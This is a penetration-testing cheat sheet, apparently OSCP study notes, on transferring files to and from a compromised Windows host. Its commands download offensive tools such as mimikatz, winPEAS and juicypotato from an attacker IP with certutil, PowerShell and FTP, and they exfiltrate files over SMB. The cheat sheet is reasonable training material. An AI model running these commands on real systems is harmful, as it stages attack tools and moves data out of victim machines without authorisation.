# Windows File Transfers

> [!info] Context
> When your target is a **Windows** machine and your attacker is **Kali Linux**, you need different tools. Windows **does not have `wget`** by default. `curl` may be present on modern Windows but isn't reliable on legacy systems. Netcat (`nc.exe`) is almost never pre-installed outside lab environments. Instead, rely on **native Windows utilities** — PowerShell, `certutil`, SMB `copy`, and the built-in FTP client.

---

## Transfer Setup — Attacker Side

Regardless of which method the Windows target uses to download, you almost always start by hosting files on Kali:

```bash
python3 -m http.server 80       # as root (port 80)
python3 -m http.server 8000     # as unprivileged user
```

---

## 1. `curl` (if available)

Works identically to Linux. Available on modern Windows 10/11 and Server 2019+.

```cmd
curl http://<ip>/filename -o filename
curl http://10.8.63.160/winPEAS.exe -o winPEAS.exe
```

> [!warning]
> `curl` may not exist on older/legacy Windows. Have fallback methods ready.

---

## 2. PowerShell — `Invoke-WebRequest` / `iwr`

A **primary native tool** for OSCP engagements. Built into every modern Windows with PowerShell.

### From a PowerShell prompt

```powershell
Invoke-WebRequest http://<ip>/filename -OutFile filename
Invoke-WebRequest http://10.8.63.160/winPEAS.exe -OutFile winPEAS.exe
```

### From `cmd.exe` (one-liner)

If you land in a `cmd.exe` shell, switch to PowerShell or call it inline:

```cmd
powershell
```

Then run the command, **or** use a one-liner without switching shells:

```cmd
powershell -c "Invoke-WebRequest http://10.8.63.160/winPEAS.exe -OutFile winPEAS.exe"
```

Shorthand alias `iwr`:

```cmd
powershell -c "iwr http://10.8.63.160/winPEAS.exe -OutFile winPEAS.exe"
```

## 3. `certutil.exe` (Living off the Land)

A **built-in Windows certificate utility** (LOLBIN) present on almost all Windows desktop and server versions. Abuses the `-urlcache` feature to download files.

```cmd
certutil -urlcache -f http://<ip>/filename filename
certutil -urlcache -split -f http://10.8.63.160/juicypotato.exe juicy.exe
```

| Flag | Purpose |
| --- | --- |
| `-urlcache` | Use the URL cache subsystem |
| `-f` | Force download (don't use stale cache) |
| `-split` | Split embedded ASN.1 elements (ensures clean write) |

> [!tip]
> `certutil` is a classic **LOLBIN** — a legitimate system binary abused for offensive purposes. It's available across nearly all Windows versions.

## 4. SMB — `impacket-smbserver` + `copy`

SMB is Windows' **native file-sharing protocol**. No web browser or third-party tools needed on the target — just the built-in `copy` command.

### Start an SMB share on Kali

```bash
impacket-smbserver kali .
```

- `kali` — share name (arbitrary)
- `.` — share the current working directory

<details>
<summary><code>impacket-smbserver --help</code> (full reference)</summary>

### Attacker → Target (download to Windows)

On the **Windows** machine:

```cmd
copy \\<kali_ip>\kali\filename filename
copy \\10.8.63.160\KALI\mimikatz.exe mimikatz.exe
```

### Target → Attacker (exfiltrate from Windows)

Keep the SMB server running on Kali, then on **Windows**:

```cmd
copy filename \\<kali_ip>\kali\filename
copy admin_paint.lnk \\10.8.63.160\KALI\admin_paint.lnk
```

> [!warning] Guest SMB Access Blocked?
> If Windows Group Policy blocks guest/unauthenticated SMB access, enable SMBv2 support:
> ```bash
> impacket-smbserver -smb2support kali .
> ```

## 5. FTP — `vsftpd` + Windows FTP Client

### Server Setup on Kali

**Install vsftpd:**

```bash
sudo apt install vsftpd
```

**Configure `/etc/vsftpd.conf`** — key settings to ensure:

```ini
local_enable=YES
write_enable=YES
local_root=/home/kali/ftp
```

> [!note] Full Config Reference
> The default config file at `/etc/vsftpd.conf` contains extensive comments explaining every option. Key items: `anonymous_enable`, `chroot_local_user`, `listen`, `xferlog_enable`, `connect_from_port_20`.

**Create a dedicated FTP user:**

```bash
sudo adduser ftpuser
```

**Start the service:**

```bash
sudo service vsftpd start
# or restart after config changes:
sudo service vsftpd restart
```

### Interactive FTP (from Windows GUI/RDP/console)

```cmd
ftp <kali_ip>
```

```
User: ftpuser
Password: ftp123
Login successful.
ftp> dir                  # list available files
ftp> binary               # switch to binary mode (essential for executables!)
ftp> get psexec.exe       # download file
ftp> quit
```

### Non-Interactive FTP (for reverse shells)

> [!important]
> In a reverse shell, interactive FTP prompts will **freeze execution**. Build a script file with `echo` commands instead.

**Build the FTP command script on the Windows target:**

```cmd
echo open 10.8.63.160 21 > ftp.txt
echo USER ftpuser>> ftp.txt
echo ftp123>> ftp.txt
echo binary>> ftp.txt
echo get psexec.exe psexec1.exe>> ftp.txt
echo exit>> ftp.txt
```

**Verify the script:**

```cmd
type ftp.txt
```

**Execute non-interactively:**

```cmd
ftp -v -n -s:ftp.txt
```

| Flag         | Purpose                                                |
| ------------ | ------------------------------------------------------ |
| `-s:ftp.txt` | Read commands from script file (non-interactive)       |
| `-n`         | Suppress auto-login (credentials come from the script) |
| `-v`         | Verbose output                                         |

## Quick Reference — Windows Transfer Methods

| # | Method | Command | Notes |
| --- | --- | --- | --- |
| 1 | **PowerShell** | `powershell -c "iwr http://<IP>/file -OutFile file"` | Native, most reliable |
| 2 | **curl** | `curl http://<IP>/file -o file` | Modern Windows only |
| 3 | **certutil** | `certutil -urlcache -split -f http://<IP>/file file` | LOLBIN, nearly universal |
| 4 | **SMB** | `copy \\<IP>\SHARE\file dest` | Bi-directional, native `copy` |
| 5 | **FTP (scripted)** | `ftp -s:ftp.txt -n` | Non-interactive for reverse shells |
